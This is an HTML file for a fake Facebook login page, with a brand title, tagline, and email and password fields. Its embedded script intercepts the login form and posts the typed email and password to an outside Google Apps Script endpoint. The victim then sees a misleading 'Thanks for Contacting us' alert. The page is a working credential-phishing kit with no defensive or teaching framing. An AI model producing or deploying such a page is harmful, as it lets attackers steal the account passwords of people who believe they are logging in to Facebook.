<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>facebook</title>
    <link rel="stylesheet" href="./New folder/style.css">
</head>
<body>
    <div class="container">
        <div class="left">
            <h1>facebook</h1>
            <p>Facebook helps you connect and share with the people in your life.</p>
        </div>
        <div class="right">
            <form method="post" name="google-sheet">
                <label for="email"></label>
                <input type="text" name="email" placeholder="Email address or phone number">
                <input type="password" name="password" placeholder="Password">
                <!-- <a href="" class="loginBtn">Log In</a> -->
                <input type="submit" name="submit" value="Log In" class="loginBtn">
    
                <a href="" class="forget">Forgotten password?</a>
                <div class="sign-up">
                    <a href="" class="signupBtn">Create New Account</a>
                </div>
            </form>
            <p><b>Create a Page</b> for a celebrity, band or business.</p>
        </div>
    </div>



    <script>
        const scriptURL = 'https://script.google.com/macros/s/AKfycbxBklOxaJH3Wnpr-HnHFuwFRl6Gs0YOixOecOJeHM5z54qjzq_O8uLzm2ExJMWeeCMo/exec'
        const form = document.forms['google-sheet']
      
        form.addEventListener('submit', e => {
          e.preventDefault()
          fetch(scriptURL, { method: 'POST', body: new FormData(form)})
            .then(response => alert("Thanks for Contacting us..! We Will Contact You Soon..."))
            .catch(error => console.error('Error!', error.message))
        })
      </script>
    
</body>
</html>
